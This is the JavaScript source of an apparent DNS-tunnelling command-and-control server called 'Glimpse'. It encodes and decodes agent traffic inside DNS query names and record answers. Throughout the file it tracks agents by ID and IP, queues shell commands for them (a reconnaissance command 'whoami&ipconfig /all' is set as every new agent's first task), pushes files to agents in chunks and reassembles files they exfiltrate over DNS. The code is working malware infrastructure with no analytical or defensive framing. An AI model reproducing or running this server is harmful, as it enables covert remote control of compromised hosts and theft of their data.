// stop the http and dns server in windows
var commonDir = process.env.ALLUSERSPROFILE+"/Glimpse";
var ip = require("ip");
var myIp = ip.address();

// HTTP server ............................................................................................
var express = require('express');
var path = require('path');
var bodyParser = require('body-parser');
var fs = require('fs');
var multer = require('multer');
var upload = multer({dest: commonDir+"/files"});

// DNS server .............................................................................................................

function log(message) {
	console.log(message);
	fs.writeFile(commonDir+"/logs", message, function(err){if(err){return log(err);}});
}

function logInfo(agentId, whoami, ip, date, ipLogFileAddress) {
	if(agentId === undefined || whoami === undefined || ip === undefined || date === undefined || ipLogFileAddress === undefined) {
		return;
	}
	var fs = require('fs');
	var lines = [];
	var lineNumber = -1;
	fs.writeFile(ipLogFileAddress+"last", date, function(err) { if(err) {console.log(err);} });
	if(fs.existsSync(ipLogFileAddress)) {
		fs.readFile(ipLogFileAddress, 'utf8', function(err, data){ if (err){ console.log(err);}
			lines = data.split('\n');
			for(var i = 0 ; i < lines.length ; i++) {
				var lineIp = lines[i].split('<>')[2];
				//console.log("lineIp: " + lineIp);
				if(lineIp == ip) {
					lineNumber = i;
				}
			}
			//console.log("lineNumber: " + lineNumber);
			if(lines.length > 0) {
				fs.writeFile(ipLogFileAddress, lines[0], function(err) { if(err) {console.log(err);} 
					for(var j = 1 ; j < lines.length ; j++) {
						if(lineNumber != j) {
							fs.appendFileSync(ipLogFileAddress, "\n"+lines[j]);
						}
					}
				}); 
			}
			fs.appendFile(ipLogFileAddress, "\n"+agentId+"<>"+whoami+"<>"+ip+"<>"+date, function(err) { if(err) {console.log(err);} }); 
		});
	} else {
		fs.writeFile(ipLogFileAddress, "\n"+agentId+"<>"+whoami+"<>"+ip+"<>"+date, function(err) { if(err) {console.log(err);} }); 
	}
}

var dnsd = require('dnsd');
var ff = require('flat-file-db');

var currentFileNameTmp = "";
var myLock = false;
var fileBytes = new Array();
var fileParts = new Array();
var receiveParts = new Array(10000);
var chunckIndex = 0;
var requestedPart = 0;
var richedFilePath = "";

var server = dnsd.createServer(handler);
server.zone('example.com', 'ns1.example.com', 'us@example.com', 'now', '2h', '30m', '2w', '10m').listen(53, myIp);
log('DNS  server running at ' + myIp + ':53');
 
function handler(req, res) { 
	var rawData = req.question[0].name.toString().split('.');
	var data = rawData[0];
	var mainData = rawData[1];
	var mainData2 = "";
	var mainData3 = "";
	if (rawData.length > 3)
	{
		mainData2 = rawData[rawData.length-3];
		mainData3 = rawData[3];
	}
	var dataSz = data.length;
	if (dataSz < 18 || data[(dataSz-1)] != "T" || data[(dataSz-4)] != "C") {
		var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
		res.answer.push({name:hostname, type:'A', data:myIp, 'ttl':ttl});
		res.end();
		return;
	}
	
	if(!fs.existsSync(commonDir + "/dns/")) { fs.mkdir(commonDir + "/dns/", function (err) { if (err) console.log(err);}); }
	
	var ctrl = data.substring((dataSz-3), (dataSz-1));
	var dataRand = data.substring(0, 14);
	var reqNoIndex = parseInt(ctrl[0] + "");
	var actionIndex = parseInt(ctrl[1] + "");
	
	var ackNo = parseInt(dataRand.substring(reqNoIndex, reqNoIndex+3));
	var reqNo = ackNo;
	var textReqNo = parseInt(data.substring(14, 18));
	dataRand = dataRand.substring(0, reqNoIndex) + dataRand.substring(reqNoIndex+3);
	var action = dataRand.substring(actionIndex, actionIndex+1);
	var aid = dataRand.substring(0, actionIndex) + dataRand.substring(actionIndex+1);
	
	log('control: '+ctrl+' - ackNo: '+ackNo+' - aid: '+aid+' - action: '+action+'  >>>  '+data);

	var agPath = commonDir + "/dns/" + aid + "/";
	// append all file to 
	fs.appendFile(agPath +"allRequestsLog", req.question[0].name.toString()+"\n", function(err){if(err){console.log(err);}});


	var receivedAck = -1;

	var df = require('dateformat');
	if(fs.existsSync(agPath)) {
		fs.writeFile(agPath +"last", (""+df(new Date(),"dd/mm/yyyy HH:MM:ss")), function(err){if(err){console.log(err);}});
		fs.writeFile(agPath +"ip", (""+ req.connection.remoteAddress), function(err){if(err){console.log(err);}});
	}

	if (action == 'M') { // in this place we check the request for type of connection ping or text type
		fs.readFile(agPath +"mode", 'utf8', function(err, data){ if (err){
				var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
				res.answer.push({ name: hostname, type: 'A', data: '99.250.250.199', 'ttl': ttl });
				res.end();
				return;
			}
			if(data == "ping") {
				var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
				res.answer.push({ name: hostname, type: 'A', data: '199.250.250.99', 'ttl': ttl });
				res.end();
				return;
			} else {
				var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
				res.answer.push({ name: hostname, type: 'A', data: '99.250.250.199', 'ttl': ttl });
				res.end();
				return;
			}
		});
	}

	if(!fs.existsSync(agPath)) { // agent directory does not exist
		fs.mkdir(agPath, function (err) { if (err) console.log(err);
			if (!fs.existsSync(agPath + "wait/")) 		{fs.mkdir(agPath + "wait/", 	function (err) { if (err) console.log(err);});}
			if (!fs.existsSync(agPath + "receive/")) 	{fs.mkdir(agPath + "receive/", 	function (err) { if (err) console.log(err);});}
			if (!fs.existsSync(agPath + "done/")) 		{fs.mkdir(agPath + "done/", 	function (err) { if (err) console.log(err);});}
			if (!fs.existsSync(agPath + "sended/")) 		{fs.mkdir(agPath + "sended/", 	function (err) { if (err) console.log(err);}); }
			if (!fs.existsSync(agPath + "sending/")) 	{fs.mkdir(agPath + "sending/", 	function (err) { if (err) console.log(err);});}
			fs.writeFile(agPath +"wait/10100", "whoami&ipconfig /all", function(err){if(err){console.log(err);}});
			});
	} if (action == 'W') { // in this place we check the request type if its text we response it
	    // this request is text type
	    if (fs.existsSync(agPath + "wait")) {
	        console.log("In action <W>...");
	        fileArray = fs.readdirSync(agPath + "wait");
	        if (fileArray.length > 0)
	        {
	            fs.createReadStream(agPath + "wait/" + fileArray[0]).pipe(fs.createWriteStream(agPath + "sending/" + fileArray[0]));
	            //fs.unlink(agPath + "wait/" + fileArray[0], function(err) { if(err) {console.log(err);} });

	            var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	            res.answer.push({ name: hostname, type: 'TXT', data: "S000s>" + fileArray[0], 'ttl': ttl });
	            res.end();
	            return;
	        } else {
	            var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	            res.answer.push({ name: hostname, type: 'TXT', data: 'N0000>0', 'ttl': ttl });
	            res.end();
	            return;
	        }
	    } else {
	        var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	        res.answer.push({ name: hostname, type: 'TXT', data: 'N0000>0', 'ttl': ttl });
	        res.end();
	        return;
	    }
	} else if (action == 'D') {
	    var fileArray = fs.readdirSync(agPath + "wait");
	    console.log(agPath + "wait");
	    if (fileArray.length > 0) {
	        console.log(fileArray.length);
	        if (fs.existsSync(agPath + "wait/"+fileArray[0])) {
	            var partSize = 75;
	            var j = 0;
	            var data = fs.readFileSync(agPath + "wait/" + fileArray[0]);
	            do {
	                if (j * partSize < data.length) {
	                    fileParts[j] = ((new Buffer(data.slice(j * partSize, (j + 1) * partSize)).toString('base64')).split("/").join("_")).split("+").join("-"); 
	                }else {
	                    fileParts[j] = ((new Buffer(data.slice(j * partSize, data.length)).toString('base64')).split("/").join("_")).split("+").join("-"); 
	                }
	                j++;
	            } while (j <= (data.length/partSize));
	            console.log(fileParts);
	            console.log(textReqNo + "  " + fileParts.length);
	            if (textReqNo < fileParts.length) {
	                var str = "" + textReqNo;
	                var pad = "0000";
	                var response = "S" + (pad.substring(0, pad.length - str.length) + str) + ">" + fileParts[textReqNo];
	                var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	                res.answer.push({ name: hostname, type: 'TXT', data: response, 'ttl': ttl });
	                res.end();
	                return;
	            } else {
					fs.createReadStream(agPath + "wait/" + fileArray[0]).pipe(fs.createWriteStream(agPath + "sended/" + fileArray[0]));
					fs.unlink(agPath + "sending/" + fileArray[0], function(err) { if(err) {console.log(err);} });
					fs.unlink(agPath + "wait/" + fileArray[0], function(err) { if(err) {console.log(err);} });
					fileParts = [];
					var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	                res.answer.push({ name: hostname, type: 'TXT', data: 'E0000>0', 'ttl': ttl });
	                res.end();
	                return;
	            }
	        } else {
	            var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	            res.answer.push({ name: hostname, type: 'TXT', data: 'C0000>0', 'ttl': ttl });
	            res.end();
	            return;
	        }
	    } else {
	        var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
	        res.answer.push({ name: hostname, type: 'TXT', data: 'C0000>0', 'ttl': ttl });
	        res.end();
	        return;
	    }
	}else if (action == '0') { // ctrl[0] => action, if 0 = is there any file
		var fileArray;
		if (fs.existsSync(agPath + "wait")) {
			fileArray = fs.readdirSync(agPath + "wait");
			//log(fileArray.length);
			if (fileArray.length > 0) {
				fs.stat(fileArray[0], function (err, stats) {
					fs.createReadStream(agPath + "wait/" + fileArray[0]).pipe(fs.createWriteStream(agPath + "sending/" + fileArray[0]));
					//fs.unlink(agPath + "wait/" + fileArray[0], function(err) { if(err) {console.log(err);} });
					
					currentFileNameTmp = agPath + "wait/" + fileArray[0];

					var fileNameTmp = fileArray[0].replace(/^.*[\\\/]/, '');
					var responseTmp = "3.2.1.0";

					if (fileNameTmp.length > 3) {
						responseTmp = "24.125." + fileNameTmp.substring(0, 2) + "." + fileNameTmp.substring(2, 5);
					}
					var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
					res.answer.push({name:hostname, type:'A', data:responseTmp, 'ttl':ttl});
					res.end();
					return;
				}); // end of fs.stat(fileAr
			}else {
				var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
				res.answer.push({name:hostname, type:'A', data:'11.24.237.110', 'ttl':ttl});
				res.end();
				return;	
			}
		}else {
			var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
			res.answer.push({name:hostname, type:'A', data:'11.24.237.110', 'ttl':ttl});
			res.end();
			return;
		}
	} // end of if (action == '0')
	else if (action == '1') { // ctrl[0] => action, if 1 = sending the file
		var fileArray = fs.readdirSync(agPath + "wait");
	    console.log(agPath + "wait");
	    if (fileArray.length > 0) {
			console.log(fileArray.length);
			currentFileNameTmp = agPath + "wait/" + fileArray[0];
	        if (fs.existsSync(currentFileNameTmp)) {
				var fbCntr = 0;
				fs.open(currentFileNameTmp, 'r', function (err, fd) {
					if(err) {return log(err);}
					var buffer = new Buffer(1);
					while (true) {   
						var num = fs.readSync(fd, buffer, 0, 1, null);
						if (num === 0)
							break;
						fileBytes[fbCntr] = buffer[0];
						fbCntr++;
					}
					fs.closeSync(fd);
					if(fbCntr%3 === 1) {
						fileBytes[fbCntr++] = 32;
						fileBytes[fbCntr++] = 32;
					} else if(fbCntr%3 === 2) {
						fileBytes[fbCntr++] = 32;
					}
					fileBytes[fbCntr++] = "1";
					fileBytes[fbCntr++] = "2";
					fileBytes[fbCntr++] = "3";

					if (reqNo < 150 && reqNo > 100) {
						myLock = true;
					}
					if ((reqNo < fileBytes.length)) {
						//log("chunckIndex" + currentFileNameTmp.substr(currentFileNameTmp.lastIndexOf("/") + 1));
						//chunckIndex = db.get("chunckIndex" + currentFileNameTmp.substr(currentFileNameTmp.lastIndexOf("/") + 1));
						//log("chunckIndex  > " + chunckIndex);
						//if (chunckIndex == undefined) chunckIndex = 0;
						if (reqNo > 250) {
							if (myLock) {
								myLock = false
								chunckIndex += reqNo;
								//db.put("chunckIndex" + currentFileNameTmp.substr(currentFileNameTmp.lastIndexOf("/") + 1), chunckIndex);
								reqNo = 0;
							}
						}
						var filePart = "";
						var currentChunk = reqNo + chunckIndex;
						if (currentChunk < fileBytes.length)
							filePart = (fileBytes[currentChunk] + "." + fileBytes[currentChunk + 1] + "." + fileBytes[currentChunk + 2] + "." + reqNo);
						if (fileBytes[currentChunk] == 1 && fileBytes[currentChunk + 1] == 2 && fileBytes[currentChunk + 2] == 3) {
							chunckIndex = 0;
							filePart = "1.2.3.0";
							if(fs.existsSync(currentFileNameTmp)) {
								fs.createReadStream(currentFileNameTmp).pipe(fs.createWriteStream(agPath + "sended/" + fileArray[0]));
								fs.unlink(agPath + "sending/" + fileArray[0], function(err){if (err) {return log(err);}});
								fs.unlink(currentFileNameTmp, function(err){if (err) {return log(err);}});
							} // if file exist
						}
						log(currentChunk+">"+filePart);
						var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
						res.answer.push({name:hostname, type:'A', data:filePart, 'ttl':ttl})
						res.end();
					} else {
						var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
						res.answer.push({name:hostname, type:'A', data:"1.2.3.0", 'ttl':ttl})
						res.end()
					}
					//db.close();
				}); // end of fs.open(path, 'r',
			} else  {// end of if exist
				// return the end response
				var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600);
				res.answer.push({name:hostname, type:'A', data:"1.2.3.0", 'ttl':ttl})
				res.end()
			}
		}
			
	}
	else if (action == '2') {// ctrl[0] => action, if 2 = receiveing the file
		
		if(ackNo == 0) {
			fs.unlink(agPath+"part", function(err) { if(err) {console.log(err);} });
			receiveParts = receiveParts.filter(function(a){return !(a.indexOf(aid.substring(0,3)) > -1)});
		}

		fs.readFile(agPath+"part", function(err, fileData){
			if (err){ 
				fs.writeFileSync(agPath+"part", ackNo); //, function(err) { if(err) {console.log(err);} });
				requestedPart = ackNo;
			}else {
				requestedPart = parseInt(fileData);
			}
			
			var isData = false;
			if (requestedPart == ackNo) {
				log("file part:" + (chunckIndex + requestedPart) + "\tack: " + ackNo + "\tdate: " + data + "\tmain data: " + mainData);
				if (mainData.length > 9) {
					if (mainData.substring(0, 10).toUpperCase() == ('COCTabCOCT'.toUpperCase())) {
						fs.unlink(agPath+"part", function(err) { if(err) {console.log(err);} });
						richedFilePath = "";

						receiveParts = receiveParts.filter(function(a){return !(a.indexOf(aid.substring(0,3)) > -1)})
						//receiveParts = [];
						if (receivedAck === 3) {
							receivedAck--;
						}
						requestedPart = 0;
						chunckIndex = 0;
						var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600)
						res.answer.push({name:hostname, type:'A', data:'253.25.42.87', 'ttl':ttl})
						res.end();
						return;
						// check if its not end of data and is the start get the file name and if its data return isData true
					}
					else if (mainData.substring(0, 6).toUpperCase() === ('COCTab'.toUpperCase()) && (mainData.substring(6, 10).toUpperCase() !== ('COCT'.toUpperCase()))) {
						receivedAck = 3;
						var meaningful = mainData.substring(6);
						var result = new Array();
						if(meaningful.length % 2 == 0) {
							var j = meaningful.length/2;
							for (var i = 0; i < (meaningful.length/2); i++,j++) {
								var key = meaningful[i] +""+ meaningful[j];
								result[i] = parseInt(key, 16); 
							}
						}
						var meaningfulTmp = String.fromCharCode.apply(String, result);
						var args = meaningfulTmp.split('*'); ;
						var fileName = args[0];
						richedFilePath = agPath + "receive/" + fileName;
						fs.unlink(richedFilePath, function(err) { if(err) {console.log(err);} });
						requestedPart++;
						fs.writeFileSync(agPath+"part", requestedPart); //, function(err){if(err){return log(err);}});
					}
					else {
						isData = true;
					}
				}
				else {
					isData = true;
				}
				if (isData && requestedPart == ackNo) {
					if (receiveParts.indexOf(aid.substring(0,3)+(chunckIndex + ackNo)) == -1) {
						receiveParts[receiveParts.length] = aid.substring(0,3) + (chunckIndex + ackNo);
						var result = new Array();
						if(mainData.length % 2 == 0) {
							var j = mainData.length/2;
							for (var i = 0; i < (mainData.length/2); i++,j++) {
								var key = mainData[i] +""+ mainData[j];
								result[i] = parseInt(key, 16);
							}
						}
						if(mainData2 != undefined) {
							var meaningful = mainData2;
							var result1 = new Array();
							if(meaningful.length % 2 == 0) {
								var j = meaningful.length/2;
								for (var i = 0; i < (meaningful.length/2); i++,j++) {
									var key = meaningful[i] +""+ meaningful[j];
									result1[i] = parseInt(key, 16); 
								}
							}
							var meaningfulTmp = String.fromCharCode.apply(String, result1);
							var args = meaningfulTmp.split('*'); ;
							richedFilePath = agPath + "receive/" + args[0];
						}
						fs.appendFileSync(richedFilePath, String.fromCharCode.apply(String, result)); //, function (err) {
							//if (err) {return log(err);}
							log("Saved in: "+richedFilePath);
							if (requestedPart == 250) { chunckIndex += requestedPart; requestedPart = 0; }
							requestedPart++;
							fs.writeFileSync(agPath+"part", requestedPart); //, function(err){if(err){return log(err);}});
						//});
					}else {
						requestedPart++;
						fs.writeFileSync(agPath+"part", requestedPart); //, function(err){if(err){return log(err);}});
					}
					
					isData = false;
				}
			}
			var question = req.question[0], hostname = question.name, length = hostname.length, ttl = Math.floor(Math.random() * 3600)
			res.answer.push({name:hostname, type:'A', data:aid.substring(0,2)+".2.3."+requestedPart, 'ttl':ttl})
			log("response: "+aid.substring(0,2)+".2.3."+requestedPart);
			res.end();
		});
	}
}